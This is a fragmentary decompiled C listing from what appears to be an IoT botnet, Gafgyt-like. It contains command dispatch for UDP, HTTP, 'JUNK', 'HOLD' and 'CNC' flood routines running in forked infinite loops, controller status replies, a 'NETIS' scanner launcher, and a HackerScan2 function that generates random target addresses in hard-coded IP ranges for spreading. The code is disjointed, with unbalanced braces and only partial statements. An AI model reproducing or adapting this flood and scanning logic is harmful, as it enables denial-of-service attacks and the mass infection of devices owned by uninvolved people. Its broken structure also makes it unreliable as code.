                                                                                        sendSTD(v262, (int16_t)v260, v261);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendSTD(v263, (int16_t)v260, v261);
                                                                                if (listFork() == 0) {
                                                                                    sendJUNK(v251, v249, v250);
                                                                                    sendSTD(v251, (int16_t)v249, v250);
                                                                                    sendHOLD(v251, v249, v250);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendJUNK(v242, v249, v250);
                                                                                        sendSTD(v242, (int16_t)v249, v250);
                                                                                        sendHOLD(v242, v249, v250);
                                                                                        __libc_close(v142);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendSTD(v262, (int16_t)v260, v261);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendSTD(v263, (int16_t)v260, v261);
                                                            if (listFork() == 0) {
                                                                sendUDP(v198, v181, v182, v183, v184, v157);
                                                                while (true) {
                                                                    if (listFork() == 0) {
                                                                        sendUDP(v319, v181, v182, v183, v184, v157);
                                                                v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                                                result5 = listFork();
                                                                                                    sendSTD(v262, (int16_t)v260, v261);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendSTD(v263, (int16_t)v260, v261);
                                                                                            v244 = listFork();
                                                                                                sendJUNK(v251, v249, v250);
                                                                                                sendSTD(v251, (int16_t)v249, v250);
                                                                                                sendHOLD(v251, v249, v250);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendJUNK(v242, v249, v250);
                                                                                                    sendSTD(v242, (int16_t)v249, v250);
                                                                                                    sendHOLD(v242, v249, v250);
                                                                                                    __libc_close(v142);
                                                                                                                result5 = listFork();
                                                                                                                    sendSTD(v262, (int16_t)v260, v261);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendSTD(v263, (int16_t)v260, v261);
                                                                                        v227 = listFork();
                                                                                            sendCNC(v238, v236, v237);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendCNC(v239, v236, v237);
                                                                                                __libc_close(v142);
                                                                                                                result5 = listFork();
                                                                                                                    sendSTD(v262, (int16_t)v260, v261);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendSTD(v263, (int16_t)v260, v261);
                                                                                                            v244 = listFork();
                                                                                                                sendJUNK(v251, v249, v250);
                                                                                                                sendSTD(v251, (int16_t)v249, v250);
                                                                                                                sendHOLD(v251, v249, v250);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendJUNK(v242, v249, v250);
                                                                                                                    sendSTD(v242, (int16_t)v249, v250);
                                                                                                                    sendHOLD(v242, v249, v250);
                                                                                                                    __libc_close(v142);
                                                                                                                                result5 = listFork();
                                                                                                                                    sendSTD(v262, (int16_t)v260, v261);
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() != 0) {
                                                                                                                                        sendSTD(v263, (int16_t)v260, v261);
                                                                            v225 = listFork();
                                                                                sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                                                                        result5 = listFork();
                                                                                                            sendSTD(v262, (int16_t)v260, v261);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendSTD(v263, (int16_t)v260, v261);
                                                                                                    v244 = listFork();
                                                                                                        sendJUNK(v251, v249, v250);
                                                                                                        sendSTD(v251, (int16_t)v249, v250);
                                                                                                        sendHOLD(v251, v249, v250);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendJUNK(v242, v249, v250);
                                                                                                            sendSTD(v242, (int16_t)v249, v250);
                                                                                                            sendHOLD(v242, v249, v250);
                                                                                                            __libc_close(v142);
                                                                                                                        result5 = listFork();
                                                                                                                            sendSTD(v262, (int16_t)v260, v261);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendSTD(v263, (int16_t)v260, v261);
                                                                                                v227 = listFork();
                                                                                                    sendCNC(v238, v236, v237);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendCNC(v239, v236, v237);
                                                                                                        __libc_close(v142);
                                                                                                                        result5 = listFork();
                                                                                                                            sendSTD(v262, (int16_t)v260, v261);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendSTD(v263, (int16_t)v260, v261);
                                                                                                                    v244 = listFork();
                                                                                                                        sendJUNK(v251, v249, v250);
                                                                                                                        sendSTD(v251, (int16_t)v249, v250);
                                                                                                                        sendHOLD(v251, v249, v250);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendJUNK(v242, v249, v250);
                                                                                                                            sendSTD(v242, (int16_t)v249, v250);
                                                                                                                            sendHOLD(v242, v249, v250);
                                                                                                                            __libc_close(v142);
                                                                                                                                        result5 = listFork();
                                                                                                                                            sendSTD(v262, (int16_t)v260, v261);
                                                                                                                                            while (true) {
                                                                                                                                                if (listFork() != 0) {
                                                                                                                                                sendSTD(v263, (int16_t)v260, v261);
                                                            v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v262, (int16_t)v260, v261);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendSTD(v263, (int16_t)v260, v261);
                                                                                        if (listFork() == 0) {
                                                                                            sendJUNK(v251, v249, v250);
                                                                                            sendSTD(v251, (int16_t)v249, v250);
                                                                                            sendHOLD(v251, v249, v250);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendJUNK(v242, v249, v250);
                                                                                                sendSTD(v242, (int16_t)v249, v250);
                                                                                                sendHOLD(v242, v249, v250);
                                                                                                __libc_close(v142);
                                                                                                            if (listFork() == 0) {
                                                                                                                sendSTD(v262, (int16_t)v260, v261);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendSTD(v263, (int16_t)v260, v261);
                                                                                    if (listFork() == 0) {
                                                                                        sendCNC(v238, v236, v237);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendCNC(v239, v236, v237);
                                                                                            __libc_close(v142);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendJUNK(v251, v249, v250);
                                                                                                            sendSTD(v251, (int16_t)v249, v250);
                                                                                                            sendHOLD(v251, v249, v250);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendJUNK(v242, v249, v250);
                                                                                                                sendSTD(v242, (int16_t)v249, v250);
                                                                                                                sendHOLD(v242, v249, v250);
                                                                                                                __libc_close(v142);
                                                                        if (listFork() == 0) {
                                                                            sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                                                                if (listFork() == 0) {
                                                                                                    sendJUNK(v251, v249, v250);
                                                                                                    sendSTD(v251, (int16_t)v249, v250);
                                                                                                    sendHOLD(v251, v249, v250);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendJUNK(v242, v249, v250);
                                                                                                        sendSTD(v242, (int16_t)v249, v250);
                                                                                                        sendHOLD(v242, v249, v250);
                                                                                                        __libc_close(v142);
                                                                                            if (listFork() == 0) {
                                                                                                sendCNC(v238, v236, v237);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendCNC(v239, v236, v237);
                                                                                                    __libc_close(v142);
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendJUNK(v251, v249, v250);
                                                                                                                    sendSTD(v251, (int16_t)v249, v250);
                                                                                                                    sendHOLD(v251, v249, v250);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendJUNK(v242, v249, v250);
                                                                                                                        sendSTD(v242, (int16_t)v249, v250);
                                                                                                                        sendHOLD(v242, v249, v250);
                                                                                                                        __libc_close(v142);
                                        if (listFork() == 0) {
                                            sendJUNK(v195, v171, v172);
                                            while (true) {
                                                if (listFork() == 0) {
                                                    sendJUNK(v321, v171, v172);
                                                    __libc_close(v142);
                                            v219 = _strncmp((char *)*v136, "UDP", 4);
                                                v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                            v244 = listFork();
                                                                                sendJUNK(v251, v249, v250);
                                                                                sendSTD(v251, (int16_t)v249, v250);
                                                                                sendHOLD(v251, v249, v250);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendJUNK(v242, v249, v250);
                                                                                    sendSTD(v242, (int16_t)v249, v250);
                                                                                    sendHOLD(v242, v249, v250);
                                                                                    __libc_close(v142);
                                                                        v227 = listFork();
                                                                            sendCNC(v238, v236, v237);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendCNC(v239, v236, v237);
                                                                                __libc_close(v142);
                                                                                            v244 = listFork();
                                                                                                sendJUNK(v251, v249, v250);
                                                                                                sendSTD(v251, (int16_t)v249, v250);
                                                                                                sendHOLD(v251, v249, v250);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendJUNK(v242, v249, v250);
                                                                                                    sendSTD(v242, (int16_t)v249, v250);
                                                                                                    sendHOLD(v242, v249, v250);
                                                                                                    __libc_close(v142);
                                                            v225 = listFork();
                                                                sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                                                    v244 = listFork();
                                                                                        sendJUNK(v251, v249, v250);
                                                                                        sendSTD(v251, (int16_t)v249, v250);
                                                                                        sendHOLD(v251, v249, v250);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendJUNK(v242, v249, v250);
                                                                                            sendSTD(v242, (int16_t)v249, v250);
                                                                                            sendHOLD(v242, v249, v250);
                                                                                            __libc_close(v142);
                                                                                v227 = listFork();
                                                                                    sendCNC(v238, v236, v237);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendCNC(v239, v236, v237);
                                                                                        __libc_close(v142);
                                                                                                    v244 = listFork();
                                                                                                        sendJUNK(v251, v249, v250);
                                                                                                        sendSTD(v251, (int16_t)v249, v250);
                                                                                                        sendHOLD(v251, v249, v250);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendJUNK(v242, v249, v250);
                                                                                                            sendSTD(v242, (int16_t)v249, v250);
                                                                                                            sendHOLD(v242, v249, v250);
                                                                                                            __libc_close(v142);
                                                                                v224 = listFork();
                                                                                    sendUDP(v198, v181, v182, v183, v184, v157);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendUDP(v200, v181, v182, v183, v184, v157);
                                                                                v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                                                            v244 = listFork();
                                                                                                                sendJUNK(v251, v249, v250);
                                                                                                                sendSTD(v251, (int16_t)v249, v250);
                                                                                                                sendHOLD(v251, v249, v250);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendJUNK(v242, v249, v250);
                                                                                                                    sendSTD(v242, (int16_t)v249, v250);
                                                                                                                    sendHOLD(v242, v249, v250);
                                                                                                                    __libc_close(v142);
                                                                                                        v227 = listFork();
                                                                                                            sendCNC(v238, v236, v237);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendCNC(v239, v236, v237);
                                                                                                                __libc_close(v142);
                                                                                                                            v244 = listFork();
                                                                                                                                sendJUNK(v251, v249, v250);
                                                                                                                                sendSTD(v251, (int16_t)v249, v250);
                                                                                                                                sendHOLD(v251, v249, v250);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() != 0) {
                                                                                                                                    sendJUNK(v242, v249, v250);
                                                                                                                                    sendSTD(v242, (int16_t)v249, v250);
                                                                                                                                    sendHOLD(v242, v249, v250);
                                                                                                                                    __libc_close(v142);
                                                                                            v225 = listFork();
                                                                                                sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                                                                                    v244 = listFork();
                                                                                                                        sendJUNK(v251, v249, v250);
                                                                                                                        sendSTD(v251, (int16_t)v249, v250);
                                                                                                                        sendHOLD(v251, v249, v250);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendJUNK(v242, v249, v250);
                                                                                                                            sendSTD(v242, (int16_t)v249, v250);
                                                                                                                            sendHOLD(v242, v249, v250);
                                                                                                                            __libc_close(v142);
                                                                                                                v227 = listFork();
                                                                                                                    sendCNC(v238, v236, v237);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendCNC(v239, v236, v237);
                                                                                                                        __libc_close(v142);
                                                                                                                                    v244 = listFork();
                                                                                                                                        sendJUNK(v251, v249, v250);
                                                                                                                                        sendSTD(v251, (int16_t)v249, v250);
                                                                                                                                        sendHOLD(v251, v249, v250);
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() != 0) {
                                                                                                                                            sendJUNK(v242, v249, v250);
                                                                                                                                            sendSTD(v242, (int16_t)v249, v250);
                                                                                                                                            sendHOLD(v242, v249, v250);
                                                                                                                                            __libc_close(v142);
                                        v219 = _strncmp((char *)*v136, "UDP", 4);
                                            v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                        if (listFork() == 0) {
                                                                            sendJUNK(v251, v249, v250);
                                                                            sendSTD(v251, (int16_t)v249, v250);
                                                                            sendHOLD(v251, v249, v250);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendJUNK(v242, v249, v250);
                                                                                sendSTD(v242, (int16_t)v249, v250);
                                                                                sendHOLD(v242, v249, v250);
                                                                                __libc_close(v142);
                                                                    if (listFork() == 0) {
                                                                        sendCNC(v238, v236, v237);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendCNC(v239, v236, v237);
                                                                            __libc_close(v142);
                                                                                        if (listFork() == 0) {
                                                                                            sendJUNK(v251, v249, v250);
                                                                                            sendSTD(v251, (int16_t)v249, v250);
                                                                                            sendHOLD(v251, v249, v250);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendJUNK(v242, v249, v250);
                                                                                                sendSTD(v242, (int16_t)v249, v250);
                                                                                                sendHOLD(v242, v249, v250);
                                                                                                __libc_close(v142);
                                                        if (listFork() == 0) {
                                                            sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                                            if (listFork() == 0) {
                                                                                sendCNC(v238, v236, v237);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendCNC(v239, v236, v237);
                                                                                    __libc_close(v142);
                                                                            if (listFork() == 0) {
                                                                                sendUDP(v198, v181, v182, v183, v184, v157);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendUDP(v200, v181, v182, v183, v184, v157);
                                                                            v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendCNC(v238, v236, v237);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendCNC(v239, v236, v237);
                                                                                                            __libc_close(v142);
                                                                                        if (listFork() == 0) {
                                                                                            sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                                                                            if (listFork() == 0) {
                                                                                                                sendCNC(v238, v236, v237);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendCNC(v239, v236, v237);
                                                                                                                    __libc_close(v142);
                                    if (listFork() == 0) {
                                        sendHOLD(v193, v167, v168);
                                        while (true) {
                                            if (listFork() == 0) {
                                                sendHOLD(v323, v167, v168);
                                            v219 = _strncmp((char *)*v136, "UDP", 4);
                                                v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                        v227 = listFork();
                                                                            sendCNC(v238, v236, v237);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendCNC(v239, v236, v237);
                                                                                __libc_close(v142);
                                                            v225 = listFork();
                                                                sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                                                v227 = listFork();
                                                                                    sendCNC(v238, v236, v237);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendCNC(v239, v236, v237);
                                                                                        __libc_close(v142);
                                                                                v224 = listFork();
                                                                                    sendUDP(v198, v181, v182, v183, v184, v157);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendUDP(v200, v181, v182, v183, v184, v157);
                                                                                v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                                                        v227 = listFork();
                                                                                                            sendCNC(v238, v236, v237);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendCNC(v239, v236, v237);
                                                                                                                __libc_close(v142);
                                                                                            v225 = listFork();
                                                                                                sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                                                                                v227 = listFork();
                                                                                                                    sendCNC(v238, v236, v237);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendCNC(v239, v236, v237);
                                                                                                                        __libc_close(v142);
                                                            if (listFork() == 0) {
                                                                sendJUNK(v195, v171, v172);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendJUNK(v196, v171, v172);
                                                                    __libc_close(v142);
                                                            v219 = _strncmp((char *)*v136, "UDP", 4);
                                                                v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                                        v227 = listFork();
                                                                                            sendCNC(v238, v236, v237);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendCNC(v239, v236, v237);
                                                                                                __libc_close(v142);
                                                                            v225 = listFork();
                                                                                sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                                                                v227 = listFork();
                                                                                                    sendCNC(v238, v236, v237);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendCNC(v239, v236, v237);
                                                                                                        __libc_close(v142);
                                                                                                v224 = listFork();
                                                                                                    sendUDP(v198, v181, v182, v183, v184, v157);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendUDP(v200, v181, v182, v183, v184, v157);
                                                                                                v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                                                                        v227 = listFork();
                                                                                                                            sendCNC(v238, v236, v237);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendCNC(v239, v236, v237);
                                                                                                                                __libc_close(v142);
                                                                                                            v225 = listFork();
                                                                                                                sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                                                                                                v227 = listFork();
                                                                                                                                    sendCNC(v238, v236, v237);
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() != 0) {
                                                                                                                                        sendCNC(v239, v236, v237);
                                                                                                                                        __libc_close(v142);
                                        v219 = _strncmp((char *)*v136, "UDP", 4);
                                            v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                    if (listFork() == 0) {
                                                                        sendCNC(v238, v236, v237);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendCNC(v239, v236, v237);
                                                                            __libc_close(v142);
                                                        if (listFork() == 0) {
                                                            sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                                            if (listFork() == 0) {
                                                                                sendCNC(v238, v236, v237);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendCNC(v239, v236, v237);
                                                                                    __libc_close(v142);
                                                                            if (listFork() == 0) {
                                                                                sendUDP(v198, v181, v182, v183, v184, v157);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendUDP(v200, v181, v182, v183, v184, v157);
                                                                            v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                                        if (listFork() == 0) {
                                                                                            sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                        if (listFork() == 0) {
                                                            sendJUNK(v195, v171, v172);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendJUNK(v196, v171, v172);
                                                                __libc_close(v142);
                                                        v219 = _strncmp((char *)*v136, "UDP", 4);
                                                            v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                        if (listFork() == 0) {
                                                                            sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                                                            if (listFork() == 0) {
                                                                                                sendUDP(v198, v181, v182, v183, v184, v157);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendUDP(v200, v181, v182, v183, v184, v157);
                                                                                            v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                        kill(v330, 9);
                        HackerPrint(v142, (int32_t)" OFF");
                        v211 = _strncmp((char *)*v136, "NETIS", 6);
                                HackerPrint(v142, (int32_t)"[NETIS] SCANNER Starting");
                                StartTheNetis();
                                v219 = _strncmp((char *)*v136, "UDP", 4);
                                    v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                if (listFork() == 0) {
                                                    sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                    while (true) {
                                                        if (listFork() != 0) {
                                                        sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                                    if (listFork() == 0) {
                                                                        sendUDP(v198, v181, v182, v183, v184, v157);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendUDP(v200, v181, v182, v183, v184, v157);
                                                                    v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                                if (listFork() == 0) {
                                                                                    sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                if (listFork() == 0) {
                                                    sendJUNK(v195, v171, v172);
                                                    while (true) {
                                                        if (listFork() != 0) {
                                                        sendJUNK(v196, v171, v172);
                                                        __libc_close(v142);
                                                v219 = _strncmp((char *)*v136, "UDP", 4);
                                                    v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                if (listFork() == 0) {
                                                                    sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                                                    if (listFork() == 0) {
                                                                                        sendUDP(v198, v181, v182, v183, v184, v157);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendUDP(v200, v181, v182, v183, v184, v157);
                                                                                    v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                                                if (listFork() == 0) {
                                                                                                    sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                            if (listFork() == 0) {
                                                sendHOLD(v193, v167, v168);
                                                while (true) {
                                                    if (listFork() != 0) {
                                                    sendHOLD(v194, v167, v168);
                                                v219 = _strncmp((char *)*v136, "UDP", 4);
                                                    v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                if (listFork() == 0) {
                                                                    sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                                                    if (listFork() == 0) {
                                                                                        sendUDP(v198, v181, v182, v183, v184, v157);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendUDP(v200, v181, v182, v183, v184, v157);
                                                                                    v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                                                if (listFork() == 0) {
                                                                                                    sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                                if (listFork() == 0) {
                                                                    sendJUNK(v195, v171, v172);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendJUNK(v196, v171, v172);
                                                                        __libc_close(v142);
                                                                v219 = _strncmp((char *)*v136, "UDP", 4);
                                                                    v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                                if (listFork() == 0) {
                                                                                    sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendUDP(v198, v181, v182, v183, v184, v157);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendUDP(v200, v181, v182, v183, v184, v157);
                                                                                                    v221 = _strncmp((char *)*v136, "HTTP", 5);
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                            int32_t v334 = __libc_fork(3); // 0x804f726
                    HackerPrint(v142, (int32_t)"TELNET ON | OFF");
            __GI_inet_ntoa((int32_t)v335);
            HackerPrint(v142, (int32_t)"My IP: %s");
        HackerPrint(v142, (int32_t)"PONG!");
=================FUNCTION : HackerScan2 ===================
++++++++ FUNCTION START 7780
++++++++ FUNCTION END 9196
++++++++ FUNCTION LENGTH 1416
    int32_t v142 = random(); // 0x8049a41
    int32_t v144 = random(); // 0x8049a5d
    int32_t v146 = random(); // 0x8049a79
    int32_t v148 = random(); // 0x8049a95
    int32_t v150 = random(); // 0x8049ab1
        szprintf(v153, (int32_t)"112.5.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v154, (int32_t)"117.165.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v155, (int32_t)"85.3.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v156, (int32_t)"37.158.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v157, (int32_t)"95.9.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v158, (int32_t)"41.252.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v159, (int32_t)"58.71.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v160, (int32_t)"104.55.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v161, (int32_t)"78.186.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v162, (int32_t)"78.189.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v163, (int32_t)"221.120.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v164, (int32_t)"88.5.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v165, (int32_t)"41.254.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v166, (int32_t)"103.20.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v167, (int32_t)"103.47.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v168, (int32_t)"103.57.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v169, (int32_t)"45.117.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v170, (int32_t)"101.51.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v171, (int32_t)"137.59.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v172, (int32_t)"1.56.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v173, (int32_t)"1.188.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v174, (int32_t)"14.204.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v175, (int32_t)"27.0.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v176, (int32_t)"27.8.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v177, (int32_t)"27.50.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v178, (int32_t)"27.54.%d.%d", (int32_t)v140, (int32_t)v141);
